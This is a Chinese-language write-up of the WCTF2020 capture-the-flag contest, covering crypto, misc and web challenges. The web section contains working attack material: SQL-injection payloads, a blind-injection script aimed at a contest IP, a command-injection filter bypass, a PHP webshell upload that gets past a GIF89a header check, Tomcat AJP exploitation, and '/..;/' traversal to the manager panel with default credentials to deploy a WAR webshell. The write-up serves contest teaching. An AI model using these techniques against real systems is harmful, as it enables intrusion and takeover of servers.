![GVYCUs.jpg](https://s1.ax1x.com/2020/03/29/GVYCUs.jpg)

这个就是考察萌新的 Python 能力，直接用 Python 算就可以了。

贴一下exp:

```python
#!/usr/bin/env
flag = ''

# part1
cnt = 1
for i in range(1, 2021):
	cnt *= i
Part1 = str(hex(int(str(cnt)[:8])))[2:]
# 不要0x

# part2
cnt = 520 ** 1314 + 2333 ** 666
Part2 = str(hex(int(str(cnt)[:8])))[2:]

# part3
# 宇宙终极问题的答案，Google一下前几条就有，取x, y, z
# 42 =（-80538738812075974）^3 + 80435758145817515^3 + 12602123297335631^3
cnt = 80538738812075974 + 80435758145817515 + 12602123297335631
Part3 = str(hex(int(str(cnt)[:8])))[2:]

# part4
# 这是定积分，比较简单，图是嫖的，算出来结果是520(怎么那么多骚东西)
cnt = 520 * 1314
Part4 = str(hex(int(str(cnt)[:8])))[2:]

flag = 'wctf2020{%s-%s-%s-%s}' % (Part1, Part2, Part3, Part4)
print(flag)
```

## B@se - 37 solves

>Author: 52HeRtz

题目：

>JASGBWcQPRXEFLbCDIlmnHUVKTYZdMovwipatNOefghq56rs****kxyz012789+/
>
>oh holy shit, something is missing...

换表的 base64 太常见了，做了一点点改动，全排列就24种。

密文：

> MyLkTaP3FaA7KOWjTmKkVjWjVzKjdeNvTnAjoH9iZOIvTeHbvD==

我用了 itertools 模块，exp：

```python
import base64
import itertools


# 34uj
string1 = "JASGBWcQPRXEFLbCDIlmnHUVKTYZdMovwipatNOefghq56rs****kxyz012789+/"
string2 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

enc = 'MyLkTaP3FaA7KOWjTmKkVjWjVzKjdeNvTnAjoH9iZOIvTeHbvD=='

miss = []
for i in string2:
	if i not in string1:
		miss.append(i)

ob = itertools.permutations(miss, 4)
tb = []
for i in ob:
	tmp = ''
	for j in i:
		tmp += j
	tb.append(tmp)
flag = ''
for x in tb:
	string1 = "JASGBWcQPRXEFLbCDIlmnHUVKTYZdMovwipatNOefghq56rs" + x + "kxyz012789+/"
	for i in enc:
		if i != '=':
			index = string1.find(i)
			flag += string2[index]
		else:
			flag += '='
	try:
		flag = base64.b64decode(flag).decode()
	except:
		pass
	if 'wctf2020' in flag:
		print(flag)
	flag = ''
```

跑出来有一些是不可见字符，有一些是不怎么对的，但可见字符就两种情况，flag 是有意义的英文单词，所以找那个最像的就可以。

```python
wctf2020{bare64_!r_v2ry_e@ry_and_fuN}
wctf2020{base64_1s_v3ry_e@sy_and_fuN}
wctf2020{bare64_!r_v2ry_e@ry_and_fuN}
wctf2020{base64_1s_v3ry_e@sy_and_fuN}
[Finished in 0.2s]
```

正解： `wctf2020{base64_1s_v3ry_e@sy_and_fuN}`

## 情书 - 32 solves

> Author: 52HeRtz

题目：

>Premise: Enumerate the alphabet by 0、1、2、.....  、25
>Using the RSA system 
>Encryption:0156 0821 1616 0041 0140 2130 1616 0793
>Public Key:2537 and 13
>Private Key:2537 and 937
>
>flag: wctf2020{Decryption}

其实这题严格意义上也不是我出的，是朋友的男朋友之前纪念日给她的，然后求助于我来解，觉得挺有意思的就直接嫖过来了。

其实这个也有猜得出来的嫌疑，不过得搞清楚它的格式，算是非 CTFer 的脑回路吧。

```python
#!/usr/bin/env
d = 937
e = 13
n = 2537

al = 'abcdefghijklmnopqrstuvwxyz'

enc = [156, 821, 1616, 41, 140, 2130, 1616, 793]
flag = ''
for i in enc:
	result = pow(i, d, n)
	flag += al[result%26]
print(flag)
# flag = iloveu
```

其实是有点坑的。。。希望不要打我

## 佛说：只能四天 - 19 solves

>Author: 52HeRtz

标题源于微博的梗，重点在佛。

题目：

>圣经分为《旧约全书》和《新约全书》
>
>hint1: 虽然有点不环保，但hint好像是一次性的，得到后就没有利用价值了。
>
>hint2: 凯撒不是最后一步，by the way，凯撒为什么叫做凯撒？

题目表述可以知道有新约与佛论禅，link：`http://hi.pcmoe.net/buddha.html`

解出来全是社会主义核心价值观，link：`http://z.duoluosb.com/`

再解就是 `RLJDQTOVPTQ6O6duws5CD6IB5B52CC57okCaUUC3SO4OSOWG3LynarAVGRZSJRAEYEZ_ooe_doyouknowfence`，后面有提示 fence，也就是栅栏密码了，这里设置是栅栏4位，根据 hint1 也可以知道 `_doyouknowfence` 这一段不用放进栅栏。

解完就是 `R5UALCUVJDCGD63RQISZTBOSO54JVBORP5SAT2OEQCWY6CGEO53Z67L_doyouknowCaesar`，提示凯撒，凯撒密码最广的是移位3位，很多在线解码器默认也是3位，所以这里也是3位移位。

最后得到 `O5RXIZRSGAZDA63ONFPWQYLPL54GSYLOM5PXQ2LBNZTV6ZDBL53W67I`，全是大写字母，容易想到(才怪)base32，解一下就可以得到flag了。

flag: `wctf2020{ni_hao_xiang_xiang_da_wo}`

出题人又是藏在床底下的一天。。。。。

## babyrsa - 35 solves

>Author: 52HeRtz

基本做过rsa的题目都懂，也是让萌新学的，题目：

>c = 28767758880940662779934612526152562406674613203406706867456395986985664083182
>n = 73069886771625642807435783661014062604264768481735145873508846925735521695159
>e = 65537

给出了，n，e，c，而且n很小，拿去 http://www.factordb.com/ 解一下就可以得到 p，q，接下来就是常规解法了。

这是 exp：

```python
#!/usr/bin/env
import gmpy2
import libnum


n = 73069886771625642807435783661014062604264768481735145873508846925735521695159
e = 65537
p = 386123125371923651191219869811293586459
q = 189239861511125143212536989589123569301

d = gmpy2.invert(e, (p-1)*(q-1))

m = pow(c, d, n)
print(libnum.n2s(m))
# wctf2020{just_@_piece_0f_cak3}
```

萌新们要是碰到模块安装的问题也可以去我博客翻翻，闲得没事干的时候整理的。

## leak - 16 solves

>Author: 52HeRtz

这题是 dp 泄露，题目：

>e = 65537
>n = 156808343598578774957375696815188980682166740609302831099696492068246337198792510898818496239166339015207305102101431634283168544492984586566799996471150252382144148257236707247267506165670877506370253127695314163987084076462560095456635833650720606337852199362362120808707925913897956527780930423574343287847
>c = 108542078809057774666748066235473292495343753790443966020636060807418393737258696352569345621488958094856305865603100885838672591764072157183336139243588435583104423268921439473113244493821692560960443688048994557463526099985303667243623711454841573922233051289561865599722004107134302070301237345400354257869
>dp = 734763139918837027274765680404546851353356952885439663987181004382601658386317353877499122276686150509151221546249750373865024485652349719427182780275825

具体原理可以参考一下 [RSA常见攻击方法](https://www.dazhuanlan.com/2019/10/04/5d970ff4a37c5/)，[RSA之拒绝套路](https://www.jianshu.com/p/74270dc7a14b)

这里只给 exp：

```python
#!/usr/bin/env
import gmpy2
import libnum

e = 65537
n = 156808343598578774957375696815188980682166740609302831099696492068246337198792510898818496239166339015207305102101431634283168544492984586566799996471150252382144148257236707247267506165670877506370253127695314163987084076462560095456635833650720606337852199362362120808707925913897956527780930423574343287847
c = 108542078809057774666748066235473292495343753790443966020636060807418393737258696352569345621488958094856305865603100885838672591764072157183336139243588435583104423268921439473113244493821692560960443688048994557463526099985303667243623711454841573922233051289561865599722004107134302070301237345400354257869
dp = 734763139918837027274765680404546851353356952885439663987181004382601658386317353877499122276686150509151221546249750373865024485652349719427182780275825

for i in range(1, e):
		if (dp*e-1) % i == 0:
			p = (dp*e-1)//i + 1
			if n % p == 0:
				q = n // p
				d = gmpy2.invert(e, (p-1)*(q-1))
				m = pow(c, d, n)
				print(libnum.n2s(m))
				exit()
# wctf2020{dp_leaking_1s_very_d@angerous}
```

# Misc

## 比赛规则 - 149 solves

看规则交 flag，网页直接复制，不多说。

## Welcome - 51 solves

题目：

> 《论语》：三人行，必有我师焉。

这是2019年国赛的签到题，提取出来改个flag。题目提示是三人行，所以三个人头就能拿flag了。当然出题人在测试的时手机打开两个人头一起来测试就可以。。。当然，其实只要是个圆形就能识别。后来又出现了空气中突然出现个圆，细思极恐。。

看了一些选手 wp 的各种截图，比如拿 tfboys 的，一个人头三个圈的。。。出题人要笑岔气了哈哈哈哈哈哈

## Space Club - 57 solves

>Author: 52HeRtz

这个算是比较常规的 misc 了，txt 里全是空格，但是长度不一样，ctrl + A 就是惊喜，那我们猜测代表为0，1。

接下来脚本一跑，什么都有：

```python
#!/usr/bin/env
#encoding=utf-8
import libnum
binary = []
tmp = ''
for x in open("space.txt", "r").readlines():
	if len(x.strip('\n')) == 6:
		tmp += '0'
	else:
		tmp += '1'
	if len(tmp) == 8:
		binary.append(tmp)
		tmp = ''
flag = ''
for i in binary:
	flag += libnum.b2s(i)
print(flag)
# wctf2020{h3re_1s_y0ur_fl@g_s1x_s1x_s1x}
```

## Shop - 18 solves

>Author: 52HeRtz

![GuCnK0.jpg](https://s1.ax1x.com/2020/03/30/GuCnK0.jpg)

这题其实是 picoCTF 2019 魔改过来的题，考察点是**整数溢出**，本来想着放个 hint 说一说是32位还是64，但是大家都很强。。。全都秒了，不过随便输入123456789也完事了，这里是 int 32。

![GuCevq.jpg](https://s1.ax1x.com/2020/03/30/GuCevq.jpg)

占4个字节  -2147483648 ~ 2147483647。

有钱就买买买：

![GuCZ2n.jpg](https://s1.ax1x.com/2020/03/30/GuCZ2n.jpg)

## find me - 30 solves

>Author: 52HeRtz

这题是我最初打CTF时在属性里找到flag，本来想用来做签到的(怎么全部是签到)，但是看大家做得好猛，就随便找了个盲文在线网站丢进去了。。。

解题思路：右键 -> 属性 -> 详细信息，把盲文复制，在线工具跑，得flag。

参考工具：[link](https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=mangwen)

## girlfriend - 24 solves

>Author: 52HeRtz

这题原本我是想用拨号键弹奏千里之外，让大家把数字弄出来base64一下，但好像非常憨，为了不被打，改成了九键键盘。很多师傅一开始联想到了 Morse，好像也有点道理。。。

我想起来以前刚开始打CTF的时候，跟学长打俄罗斯的比赛，我硬是听了一晚上没听出来，后知后觉才发现有 `dtmf-decoder`这种东西。

这里跑一遍就可以得到

```
999*666*88*2*777*33*6*999*4*444*777*555*333*777*444*33*66*3*7777
```

按的时候用 * 分隔了一下，对着键盘看一下就完事了。

![GnaR76.png](https://s1.ax1x.com/2020/03/30/GnaR76.png)

参考工具在 Gayhub 上搜 dtmf 第一个就是，环境是 Python2

写脚本把数字替换成字母也很方便，这里不写了。（懒

## Alison likes jojo - 13 solves

> Author: Alison

Alison 大腿子友情出的题目，还是去年给我的，连饭都没吃，我可感动了。

打开压缩包我们可以看到两张图片，先 binwalk 一下第一张图片

![GndPun.jpg](https://s1.ax1x.com/2020/03/30/GndPun.jpg)

有一个压缩包，这里我用 foremost 分离

![GnddKA.jpg](https://s1.ax1x.com/2020/03/30/GnddKA.jpg)

进去发现压缩包，解压要密码，用 fcrackzip 跑一下kali自带的rockyou字典，几秒就出来了

![Gnd9js.jpg](https://s1.ax1x.com/2020/03/30/Gnd9js.jpg)

解压之后发现有个txt，base64几下就可以得到 `killerqueen`，不知道有什么用，但给出来一定有用，另一个图片是 jpg，所以我们可以尝试与 jpg 有关的隐写工具，这里是 `outguess`。之前得到的就是key，提取出来就是flag。

![Gndpcj.jpg](https://s1.ax1x.com/2020/03/30/Gndpcj.jpg)

## 爬 - 31 solves

>Author: 52HeRtz

又是一个送分题，我doc把flag放进图片的底部然后转成pdf。预期解是用Photoshop打开可以看到另一张图，不过wps或者其它可以编辑pdf的软件打开直接把图片移开也是可以的。。。这里就不多说了。

## 调查问卷 - 58 solves

填问卷得分，Google的问卷需要科学上网一下。

# Web

## checkin - 90 solves

>Author: 52HeRtz

打开界面问作者，作者在题目都会说明，输入栏限制了最长3个，按钮又不让你按，于是改前端：

![GnWzX6.png](https://s1.ax1x.com/2020/03/30/GnWzX6.png)

然后弹出一个框框，提示为远古的博客（博客托管在 GitHub，刚好Github比赛前一天又出事了，一度焦虑）

![GnWx6x.png](https://s1.ax1x.com/2020/03/30/GnWx6x.png)

进去看看，在主页就有一半的 flag

![Gnf90O.png](https://s1.ax1x.com/2020/03/30/Gnf90O.png)

这里有一个小心机，第一次看的时候肯定以为没有放全，等反应过来的时候开始回删了，所以得审前端或者再等一遍（逃

然后远古的博客，灵感来自于 ctfhub 的彩蛋题，文章是按时间排序的，那么翻到最后一页发现有个 1970 年的博客，文章底部就有另一半的 flag，这个就是签到题，我想了最久的一道题。

ps：那篇文章很有意义，可以看看，嘻嘻。

## admin - 70 solves

>Author: 52HeRtz

**login as admin**

这题一开始万能密码就能拿flag，后来觉得太简单了，加点基础内容，登录框首先万能密码就能绕过，当然弱口令也可以，admin/admin123456，不过不建议爆破。。。好几次都打down了。

**本地ip**

加 xff 头部就可以绕过了：`X-Forwarded-For:127.0.0.1`，用一些浏览器插件就可以解决了，Hackbar 也可以 add header

接下来 GET 传参 `ais=520` 和 POST 传参 `wust=1314` 就可以了，最后拿到一个被分解的 url，是 paste.ubuntu 网站的一个粘贴代码的地方，相信新生学c语言的时候没少用。。。所以很容易猜出来，又是排列组合，最多6次，去到网站后得到一串base64，解码得flag

## CV Maker - 43 solves

>Author: 52HeRtz

这题其实是有点问题，代码写得不太好，一开始在纠结过滤 `ph` 还是 `htaccess`，就先都写上去，结果最后忘了删。。。最后直接php就能上传了，谢谢 `Y1ng` 师傅指出。而且不是动态靶机应该做一下 `sandbox`，因为一开始只是想给十几个人打的没想那么多。。。后来还是大意了。

打开界面就是一个主页，要注册什么的（这里放了一个小彩蛋，不知道大家有没有注意到

![GnfpnK.png](https://s1.ax1x.com/2020/03/30/GnfpnK.png)

然后注册进去就是一个个人信息的界面，这里非常贴心的把网站所有功能全部去掉了，把头像上传放到了最显眼的地方，那就是文件上传了。

然后上传一个图片，更改头像后发现f12可以看到文件路径，于是上传一句话试试，发现非常贴心地返回：

![GnfRHO.png](https://s1.ax1x.com/2020/03/30/GnfRHO.png)

那就是用 exif_imagetype() 来检测是不是图片，这个很简单，文件头加 `GIF89a` 就可以了，上传上去后缀还是php，这里设置得很简单，然后蚁剑连上去，可以在根目录上有flag。

![Gnf44H.png](https://s1.ax1x.com/2020/03/30/Gnf44H.png)

但是打开为空，考虑权限问题，但是很贴心地准备了readflag，运行得flag

![Gnfo8A.png](https://s1.ax1x.com/2020/03/30/Gnfo8A.png)

## 朴实无华 - 24 solves

>Author: 52HeRtz

枯燥的代码审计，打开是一个 hackme，注意到标题有 `人间极乐bot`，很容易就知道去 `robots.txt` 看看，可以得到

```
User-agent: *
Disallow: /fAke_f1agggg.php
```

访问发现有个假flag，f12看报文可以察觉到一个头部：

![GnfICd.png](https://s1.ax1x.com/2020/03/30/GnfICd.png)

于是就进入到朱一旦的枯燥页面。

接下来就是代码审计了。

**intval**

这个比较常见了，`intval()` 在处理16进制时存在问题，但强制转换时是正常的，intval(字符串)为0，但是intval(字符串+1) 会自动转换成数值的，php7里面修复了这个东西，这里输入 `0x1234` 即可绕过。

**MD5**

这个考察php的弱等于，当两边为0e的时候，php会解析为0，当然 0e 后面得是数字。

写个脚本跑个几分钟就有：

```python
#!/usr/bin/env
#encoding=utf-8

import hashlib
import re
import random


def main():
	global dict_az
	dict_az = 'abcdefghijklmnopqrstuvwxyz'
	i = 0
	while True:
		result = '0e'
		result += str(i)
		i = i + 1
		hashed_s = hashlib.md5(result.encode('utf-8')).hexdigest()
		r = re.match('^0e[0-9]{30}', hashed_s)
		if r:
			print("[+] found! md5( {} ) ---> {}".format(result, hashed_s))
			exit(0)

		if i % 1000000 == 0:
			print("[+] current value: {}       {} iterations, continue...".format(result, str(i)))


if __name__ == '__main__':
	main()

# 0e215962017
```

**命令执行**

这里过滤了空格和cat，空格的话一搜就有很多，比如 `%09`，`${IFS}`等等，这里用 `%09` 为例，cat的话换成tac就可以了。

首先 ls 一下看见那个巨傻的flag名，然后 `tac%09flll*` 就可以读到flag了。

## 颜值成绩查询 - 14 solves

>Author: 52HeRtz

常规的 sql 注入题目，这里过滤了空格和union，同时检查了 UA，带 `sqlmap` 的就 die，所以无脑 `sqlmap` 是不行的。

解法：用 `/**/` 代替空格，双写 union 绕过: `uniunionon`

首先用order by把列数猜出来，这里是3，union 查询必须列数相等。

然后查表

```sql
union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()
绕过方式如上
```

查列

```sql
union select 1,2,group_concat(column_name) from information_schema.tables where table_name=flag
绕过方式如上
```

可以发现flag表中有flag和value，直接查value即可。

payload: 

```sql
?stunum=-1/**/uniounionn/**/select/**/1,2,value/**/from/**/flag#
```

后来发现好多人是盲注跑出来的，当然也可以，这里给出 `Y1ng` 师傅的 `exp`:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#颖奇L'Amore www.gem-love.com #转载请勿删除水印
import requests
from urllib.parse import *
res = ''
alphabet = ['{','}', '@', '_',',','a','b','c','d','e','f','j','h','i','g','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','G','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','0','1','2','3','4','5','6','7','8','9']

for i in range(1,100):
	for char in alphabet:
		# information_schema,ctf
		# payload = "select/**/group_concat(schema_name)/**/from/**/information_schema.schemata"

		#flag,score
		# payload = "select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()" 

		#flag,value,id,name,score
		# payload = 'select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()'
		
		#wctf2020{e@sy_sq1_and_y0u_sc0re_1t}
		payload = "select/**/group_concat(value)/**/from/**/flag"
		payload = quote(payload)
		url='http://101.200.53.102:10114/?stunum=2/(ascii(substr(({}),{},1))={})'.format(payload, i, ord(char))
		r = requests.get(url)
		# print(r.text[2473:2499])
		if '666' in r.text:
			res += char
			print(res)
			break
```

## easyweb - 23 solves

>Author: longofo

这个题目考点就是上个月 tomcat 的 CVE，也是比赛前一天才决定放上去的，一开始我只想着读个flag就算了，但学长觉得直接读太没意思了，事实证明确实如此。

解题：配合上传文件，任意类型都可以，然后利用ajp在uri路径带jsp后缀时包含上传的文件并解析为jsp，通过rce，用命令find匹配flag。

一开始是想提示具体漏洞的，但是后来发现有几个师傅都做出来了就觉得还是可以的。

首先就是用 poc 读发现可以读到

![GnhPK0.png](https://s1.ax1x.com/2020/03/30/GnhPK0.png)

预期解是上传一个🐎，执行后回显，然后通过poc去读自己的🐎，但是因为是临时出题，所以有了一些非预期解，有师傅找到我说读 `/home/tomajp/.bashrc_history` 可以读到flag的位置。。。这个是真的没想到

下面是预期解解法：

![GnhAVU.png](https://s1.ax1x.com/2020/03/30/GnhAVU.png)

然后用poc读命令，本地测试 `ipconfig` ，可以得到回显。

![GnhFbT.png](https://s1.ax1x.com/2020/03/30/GnhFbT.png)

这样直接执行 find 命令来找 flag 的字眼，就可以在根目录上找到有一个叫 `flaaaag` 的目录，目录里面有一个 `what_you_want` 的文件，执行命令 `cat /flaaaag/what_you_want` 即可读到flag。

## train yourself to be godly - 1 solves

> Author: longofo

页面是 examples，其实洞不在这里，好像一般人很难想得到，肯定得需要 hint，于是就有了 Orange 大哥在 BlackHat 上的一个议题，就是那个 pdf，主要内容就是URL路径参数不规范引发的问题，能造成的危害如下

![Gn4CJH.png](https://s1.ax1x.com/2020/03/30/Gn4CJH.png)

apache中的`tomcat/webapps`目录如下。

既然题目是用了examples目录作为网站根目录，那么上图中的Web容器控制台和管理界面这一点就显得很有意思了

![GnhzdO.png](https://s1.ax1x.com/2020/03/30/GnhzdO.png)

manage目录是可以上传WAR文件部署服务，也就是说可以通过manage目录实现文件上传，继而实现木马上传，也就是第二个hint。

![Gn4FSA.png](https://s1.ax1x.com/2020/03/30/Gn4FSA.png)

我们可以看到 pdf 有一个这样的东西，告诉我们可以通过 `/..;/manager/html` 进入到manager页面。

并且随便加一串路径，根据报错信息知道我们当前的tomcat的root路径为examlpes

![Gn49Fe.png](https://s1.ax1x.com/2020/03/30/Gn49Fe.png)

目录穿越到 manager 得输入密码验证，这里是弱密码 `tomcat/tomcat` 

![Gn43yq.png](https://s1.ax1x.com/2020/03/30/Gn43yq.png)

接下来就是上传 war 包拿 webshell，github挑一个就好了，这里用 LandGrey 的。

可以直接用`jar cvf yourname.war webshell.jsp`命令将webshell.jsp打包成war

选择文件，上传。

![Gn41ln.png](https://s1.ax1x.com/2020/03/30/Gn41ln.png)

根据报错信息明显路径拼结完是example/manager/html/upload，缺少一个/..;/，加一个再试

返回一个403，这说明/manager/html/upload路径访问到了，但是权限不够，那一般问题就出在cookie或者session没给，www没有目录访问权限身上。按照目前的思路来说，不会出现服务器权限不足的问题，那就只能是cookie没添。利用burpsuit从头开始抓包，在访问`/..;/manager/html`出现了Set-Cookie(set-Cookie的Path是指此cookie只在Path目录下起作用)，那么我们403的问题就迎刃而解，只需要将/example换成Path参数指定的/manage就行，再把cookie加上就完事了。

![Gn4lSs.png](https://s1.ax1x.com/2020/03/30/Gn4lSs.png)

修改post，添加cookie（ps: 由于cookie只能用一次，所以还是403的话，再请求一次`/..;/manager/html`，更换新的cookie就行了 ），上传完毕后可以看到war已安装好了，访问上传的war，注意这里还有一个`/..;/`的坑，剩下的就是根据自己的马找flag了。

当然直接找flag是找不到的，这道题我改得比较玄学，加了《圣经》新约：《提摩太后书》里的文章。（逃

![Gn4MWj.png](https://s1.ax1x.com/2020/03/30/Gn4MWj.png)

![Gn4UkF.png](https://s1.ax1x.com/2020/03/30/Gn4UkF.png)

可以看到在Timothy里面，cat 一下，是一段文章，这里知道flag格式，grep一下 wctf2020，就可以看到flag了。

![GnXUzT.png](https://s1.ax1x.com/2020/03/30/GnXUzT.png)

![GnXYiq.png](https://s1.ax1x.com/2020/03/30/GnXYiq.png)

In the end, train yourself to be godly.